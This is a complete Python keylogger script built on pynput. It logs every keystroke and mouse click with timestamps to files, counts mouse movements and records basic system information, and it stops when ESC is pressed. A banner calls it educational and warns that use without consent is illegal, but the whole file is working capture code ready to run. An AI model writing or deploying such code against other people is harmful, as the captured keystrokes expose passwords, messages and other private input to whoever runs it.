from pynput import keyboard, mouse
from datetime import datetime
import threading
import time
import os
import platform
import json

class AdvancedKeylogger:
    def __init__(self, log_dir="logs"):
        # Create log directory if it doesn't exist
        self.log_dir = log_dir
        os.makedirs(log_dir, exist_ok=True)
        
        # Initialize timestamps
        self.start_time = datetime.now()
        self.last_activity = self.start_time
        
        # Initialize counters
        self.keystroke_count = 0
        self.mouse_click_count = 0
        self.mouse_move_count = 0
        
        # Create log files
        self.keyboard_log = os.path.join(log_dir, "keyboard_log.txt")
        self.mouse_log = os.path.join(log_dir, "mouse_log.txt")
        self.statistics_log = os.path.join(log_dir, "statistics.json")
        
        # Initialize flags
        self.running = True
        
        # Get system info
        self.system_info = {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor()
        }

    def get_char(self, key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        if not self.running:
            return False
            
        try:
            timestamp = datetime.now()
            key_char = self.get_char(key)
            
            log_entry = {
                "timestamp": timestamp.strftime("%Y-%m-%d %H:%M:%S.%f"),
                "event": "keypress",
                "key": key_char
            }
            
            with open(self.keyboard_log, 'a') as f:
                f.write(json.dumps(log_entry) + "\n")
                
            self.keystroke_count += 1
            self.last_activity = timestamp
            
        except Exception as e:
            print(f"Error logging keypress: {str(e)}")

    def on_click(self, x, y, button, pressed):
        if not self.running:
            return False
            
        try:
            timestamp = datetime.now()
            
            log_entry = {
                "timestamp": timestamp.strftime("%Y-%m-%d %H:%M:%S.%f"),
                "event": "click",
                "button": str(button),
                "pressed": pressed,
                "position": {"x": x, "y": y}
            }
            
            with open(self.mouse_log, 'a') as f:
                f.write(json.dumps(log_entry) + "\n")
                
            if pressed:
                self.mouse_click_count += 1
            self.last_activity = timestamp
            
        except Exception as e:
            print(f"Error logging mouse click: {str(e)}")

    def on_move(self, x, y):
        if not self.running:
            return False
            
        self.mouse_move_count += 1
        self.last_activity = datetime.now()

    def update_statistics(self):
        while self.running:
            try:
                current_time = datetime.now()
                duration = (current_time - self.start_time).total_seconds()
                
                statistics = {
                    "start_time": self.start_time.strftime("%Y-%m-%d %H:%M:%S"),
                    "current_time": current_time.strftime("%Y-%m-%d %H:%M:%S"),
                    "duration_seconds": duration,
                    "keystrokes": self.keystroke_count,
                    "mouse_clicks": self.mouse_click_count,
                    "mouse_movements": self.mouse_move_count,
                    "keystrokes_per_minute": (self.keystroke_count * 60) / duration if duration > 0 else 0,
                    "last_activity": self.last_activity.strftime("%Y-%m-%d %H:%M:%S"),
                    "system_info": self.system_info
                }
                
                with open(self.statistics_log, 'w') as f:
                    json.dump(statistics, f, indent=4)
                    
                time.sleep(1)  # Update every second
                
            except Exception as e:
                print(f"Error updating statistics: {str(e)}")
                time.sleep(1)

    def start(self):
        print(f"[*] Advanced Keylogger started")
        print(f"[*] Logs directory: {self.log_dir}")
        print("[*] Press ESC to stop logging")
        
        # Start statistics thread
        stats_thread = threading.Thread(target=self.update_statistics)
        stats_thread.start()
        
        # Start keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        keyboard_listener.start()
        
        # Start mouse listener
        mouse_listener = mouse.Listener(
            on_click=self.on_click,
            on_move=self.on_move)
        mouse_listener.start()
        
        # Wait for ESC key
        with keyboard.Events() as events:
            for event in events:
                if event.key == keyboard.Key.esc:
                    break
        
        # Cleanup
        self.running = False
        keyboard_listener.stop()
        mouse_listener.stop()
        stats_thread.join()
        
        print("\n[*] Keylogger stopped")
        print(f"[*] Final statistics saved to: {self.statistics_log}")

def main():
    print("=== Advanced Educational Keylogger ===")
    print("\nWARNING: This tool is for educational purposes only.")
    print("Using keyloggers without consent is illegal.")
    
    # Get log directory from user
    log_dir = input("\nEnter log directory (default: logs): ").strip()
    if not log_dir:
        log_dir = "logs"
    
    # Create and start keylogger
    keylogger = AdvancedKeylogger(log_dir)
    keylogger.start()

if __name__ == "__main__":
    main()

# Show the code has been loaded
print("Advanced Keylogger code ready to run. Execute 'main()' to start.")